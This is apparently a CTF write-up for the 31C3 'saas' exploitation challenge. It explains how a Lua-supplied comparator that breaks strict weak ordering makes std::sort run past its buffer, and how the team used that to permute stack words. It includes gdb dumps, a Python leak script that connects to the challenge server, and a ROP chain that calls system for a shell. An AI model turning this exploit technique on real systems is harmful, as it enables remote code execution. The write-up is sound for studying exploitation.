*saas* was an exploitation challenge worth 50 points at the 31C3 CTF.

We solved it after the competition was already over.

We're provided remote access to a number sorting service:

    Goodbye

As you can see, we can choose either a predefined comparator function for the
sort or we can provide our own Lua code to define it.

Initially we tried to reverse the binary, which was made a bit harder by the
fact that binary is relocatable and jumps to external library functions are
patched only during the loading phase.

We note the following:

* NX and ASLR are enabled, the binary is fully position independent so its
  base address is also randomized.
* The program creates a buffer of size `4 * 1025` and fills the first word with
  the magic value `0xdeadbeef`.
* Input numbers are written into that buffer after the magic value.
* The call to `std::sort` is inlined, which makes the `main` function really
  long.
* The predefined comparators are also implemented in Lua and can be found as
  strings in the binary.
* Before executing any Lua code and before starting a sort, a call to `alarm`
  sets a timeout of 10 seconds, after which `SIGALRM` is raised. The alarm is
  cleared after the corresponding operation has finished. This is annoying for
  debugging.
* For the actual sorting, the function `comparator` at offset `0x1fc0` is used.
  It basically calls the Lua function `f` to compare the two given numbers (see 
  image below).

![comparator]({{ site.url }}/imgs/31c3-ctf_saas_1.png)

You will notice in the screenshot the weird calls with offset 1. This is
because the disassembler sees only the unrelocated binary.

The first thing we want to do is get rid of the alarm, which is an easy
exercise. We can just patch the binary and replace the first function argument 
`0xa` with `0x0`.

## A not so useful bug

The program assumes that the function `f` has exactly two parameters. It
pushes first the function object and then the arguments on the internal 
Lua stack. However, we can control the number of parameters! So we can in fact
read and write beyond the stack by adding parameters.

For debugging, we looked at the [Lua source
code](https://github.com/LuaDist/lua/blob/5.2/src/lstate.h) to figure out the
layout of the internal data structures. The global `lua_State` that also has
a pointer to the top of the stack can be accessed under the symbol `L`. Let's
see:

So we can in fact control the stack. With some experimentation we found out
that we can have ~100 parameters. However, the stack has a size of only 40, so
we can overflow it.

The bad news is that we did not find anything particularily interesting to
overwrite. Maybe this bug is actually exploitable, but the conditions seem
tough. We had one more idea though.

## `std::sort` and undefined behaviour

Maybe a bit untuitively, the C++ standard places strict requirements onto the
comparator function provided to `std::sort` and other standard library
functions. Specifically, it is required that the comparator defines a [strict
weak ordering](http://en.wikipedia.org/wiki/Weak_ordering#Strict_weak_orderings).
Providing a comparator that does not fulfil these requirements leads to
[undefined behaviour](http://en.wikipedia.org/wiki/Undefined_behavior), which
basically means that "anything can happen". In particular, the implementation
is allowed to infinitely loop or crash or overflow memory in this case.

And indeed, modern implementations of the C++ standard library opt to save some
bounds checking in favor of performance. An example of a comparator that is
very likely to crash with a recent GCC compiler is the following:

    #include <bits/stdc++.h>
    using namespace std;

    int main() {
        vector<int> x;
        for (int i = 0; i < 100; ++i)
            x.push_back(i);
        int i = 0;
        sort(begin(x), end(x), [&](int a, int b) {
            if (i++ < 1000) return true;
            return a < b;
        });
    }

This sort actually overwrites the heap past the end of the allocated buffer,
resulting in memory corruption. To understand why, we need to have a look at
[the implementation of `std::sort` in the standard
library](https://gcc.gnu.org/svn/gcc/trunk/libstdc++-v3/include/bits/stl_algo.h).

We notice several functions with the prefix `__unguarded_`. One of them is
`__unguarded_linear_insert`. It underflows the buffer, which is not helpful to us
because (a) all the interesting values lie after the buffer and (b) the
comparator has a check that makes it exit immediately if one of the values is
`0xdeadbeef`, which is the value in front of the buffer...

Let's dig deeper:

    /// This is a helper function...
    template<typename _RandomAccessIterator, typename _Compare>
      _RandomAccessIterator
      __unguarded_partition(_RandomAccessIterator __first,
                            _RandomAccessIterator __last,
                            _RandomAccessIterator __pivot, _Compare __comp)
      {
        while (true)
        {
          while (__comp(__first, __pivot))
            ++__first;  // OVERFLOW HERE!!
          --__last;
          while (__comp(__pivot, __last))
            --__last;
          if (!(__first < __last))
            return __first;
          std::iter_swap(__first, __last);
          ++__first;
        }
      }
  
    /// This is a helper function...
    template<typename _RandomAccessIterator, typename _Compare>
      inline _RandomAccessIterator
      __unguarded_partition_pivot(_RandomAccessIterator __first,
                                  _RandomAccessIterator __last, _Compare __comp)
      {
        _RandomAccessIterator __mid = __first + (__last - __first) / 2;
        std::__move_median_to_first(__first, __first + 1, __mid, __last - 1,
                                    __comp);
        return std::__unguarded_partition(__first + 1, __last, __first, __comp);
      }
  
      // ... 

    /// This is a helper function for the sort routine.
    template<typename _RandomAccessIterator, typename _Size, typename _Compare>
      void
      __introsort_loop(_RandomAccessIterator __first,
                       _RandomAccessIterator __last,
                       _Size __depth_limit, _Compare __comp)
      {
        while (__last - __first > int(_S_threshold))
        {
          if (__depth_limit == 0)
            {
              std::__partial_sort(__first, __last, __last, __comp);
              return;
            }
          --__depth_limit;
          _RandomAccessIterator __cut =
            std::__unguarded_partition_pivot(__first, __last, __comp);
          std::__introsort_loop(__cut, __last, __depth_limit, __comp);
          __last = __cut;
        }
      }

This looks very promising. `__introsort_loop` is basically a quicksort with
a fallback to heap sort in case a certain recursion depth is reached.
It uses `__unguarded_partition_pivot` to partition the array.

If we watch closely, we control the return value of `__unguarded_partition` and
thus `__unguarded_partition_pivot`! We can just make the comparator evaluate to
`true` as often as we want, increasing the `__first` pointer beyond the end of
the buffer. Because we then have `__first > __last`, the function returns
`__first` immediately.

So what happens if we force `__unguarded_partition_pivot` to return an
iterator past the end of the buffer? The recursion into the "right half" 
`[cut, last)` will do nothing because `cut > last`. Then the algorithm goes on to sort 
the "left half" `[first, cut)`, which is bigger then the original buffer!

In summary: We are now able to sort not only our 1024 input numbers, but also
a range that goes beyond this buffer. E.g. we could sort 2048 words, namely our
input plus 1024 extra words that happen to lie on the stack). Since we control
the comparator, we actually have a very powerful primitive: We can permute the
values on the stack arbitrarily, starting from the beginning of our buffer.
In particular, we can read and write arbitrarily on the stack.

We know that we can arbitrarily permute the stack, but we are to lazy to figure
out the exact sequence of answers that we would need for the permutation we
want. So we use a trick: We write our own little C++ program that calls
`std::sort` with a custom comparator, and after an initial sequence of answers 
to extend the sort range, we just fall back to a standard "less-than" comparator
and record its answers. `std::sort` will now just do its job and sort the extended 
buffer.

We lay out the numbers in a way such that the sort will have to perform a swap
of the first and last element in the range, and leave the rest of the elements
intact. Our input array will look like this:

    {m, 1, 2, ..., m - 1, 0}

If within SaaS, we replay the exact answers that we recorded, it will happily
repeat this exact permutation, regardless of the actual values in the array.
[The C++ program we created to record the
answers](https://github.com/kitctf/writeups/blob/master/31c3-ctf/saas/compute_answers.cpp)
will just output a sequence of answers that swaps the elements at offsets `0`
and `offset`, when `std::sort` is called on a buffer of size `n`.

## Leak a libc address

We can now read an arbitrary value on the stack, we just need to pick one! A good
candidate is the return address into `__libc_start_main`:

    gdb-peda$ break main
    Breakpoint 1 at 0x15a6
    gdb-peda$ run

    0xffffc09c:	0x0000000a	0x565578d7	0x01eef476	0x00000000
    0xffffc0ac:	0x46baeb00	0xf7f5ce60	0x565578d7	0xf7ed829b
    0xffffc0bc:	0xffffc114	0xffffc10c	0x00000008	0xffffd128
    0xffffc0cc:	0x56556dbd	0xffffc10c	0xffffc114	0x56556fc0
    0xffffc0dc:	0x56556fc0	0x00000000	0x00000000	0x00000000
    0xffffc0ec:	0x00000000	0x00000000	0x00000000	0x00000000
    0xffffc0fc:	0x00000000	0x00000000	0x00000002	0xdeadbeef
    0xffffc10c:	0x00000001	0x00000002	0x00000000	0x00000000

So the input buffer landed at `0xffffc10c`. Let's see what's 1024 words later:

    gdb-peda$ x/12wx 0xffffc10c + 1024*4
    0xffffd10c:	0x46baeb00	0xf7e66420	0xf7f57c14	0x565577db
    0xffffd11c:	0xf7e66000	0x00000000	0x56556e57	0x00000000
    0xffffd12c:	0xf7cc9e5e	0x00000001	0xffffd1c4	0xffffd1cc

Perfect, so the return address is the 8-th word after the buffer. Let's [write
an exploit](https://github.com/kitctf/writeups/blob/master/31c3-ctf/saas/leak.py)!

    import sys, socket, time, os, re, telnetlib

    def get_comparator(n, offset):
        return """
    answers = %s
    i = 0
    function f(a,b)
        i = i + 1
        return answers[i]
    end



    """ % os.popen("./compute_answers %d %d" % (n, offset)).read().strip()

    def wait_for(s):
        while True:
            p = sock.recv(4096)
            if s in p:
                break

    def swap(offset, value):
        n = 1024
        values = [value] + list(xrange(1,n))
        sock.send("7\n" +
                get_comparator(n, n + offset) +
                "1024\n" +
                "\n".join(map(str,values)) + "\n")
        res = None
        while True:
            p = sock.recv(4096)
            m = re.search("Number 1 is now: (\d+)", p)
            if m:
                res = m.group(1)
            if "custom\n:" in p:
                break
        return int(res)

    sock = socket.create_connection(("188.40.18.75", 1234))

    wait_for("custom\n:")
    libc_ret = swap(8, 0x41414141)
    print "[*] leaked ret addr to libc_start_main =", hex(libc_ret)

And voila:

    $ python2 leak.py
    [*] leaked ret addr to libc_start_main = 0xf74aca83

The offset is different on my local machine because I have a different 
libc version installed.

Also, if we try this under a debugger, we get

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()
    gdb-peda$ 

So the swap worked and we control EIP.

## ROP

From here on it's a simple exercise: We know the libc base and we can write
arbitrary values onto the stack. We can just write a ROP payload, which is what
we did. The payload

1. `read`s a value from stdin into the libc's `.bss` segment
2. calls `system` with the received value as an argument

The [final exploit
code](https://github.com/kitctf/writeups/blob/master/31c3-ctf/saas/exploit.py)
reliably gives shell access and we are able to retrieve the flag

    $ python2 exploit.py
    [*] leaked libc base = 0xf745b000
    [*] writing ROP 0 0xf7536160
    [*] writing ROP 1 0xf7499760
